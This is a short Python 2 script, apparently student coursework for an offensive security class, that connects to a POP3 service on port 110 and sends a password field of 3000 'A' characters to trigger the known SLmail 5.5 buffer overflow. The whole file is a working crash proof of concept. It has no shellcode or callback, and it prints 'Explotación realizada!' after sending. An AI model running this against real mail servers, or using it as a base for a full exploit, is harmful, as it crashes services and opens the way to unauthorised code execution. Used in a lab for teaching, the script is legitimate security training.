#!/usr/bin/python

###########################################################
# Estructura desarrollada por Daniel Garcia Baameiro para #
# la asignatura de Seguridad Ofensiva de la Escuela       #
# Internacional de Posgrado                               #
###########################################################

## Alumno: Juan Manuel Rodriguez Trillo
## Email: oneman.rt@gmail.com

import sys, socket

if len(sys.argv) < 2:
	print "\nUso del exploit: " + sys.argv[0] + " <HOST>\n"
	sys.exit()

cmd = "OVRFLW "
fuzz = "\x41" * 3000
end = "\r\n"

buffer = cmd + fuzz + end

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
	print "\nEnviando nuestro código..."
	s.connect((sys.argv[1], 110))
	data = s.recv(1024)
	s.send('USER username' + '\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	data = s.recv(1024)
	s.close()
	print "\nExplotación realizada!"
except:
	print "\nEsta levantado el servicio de SLmail 5.5 POP3?"
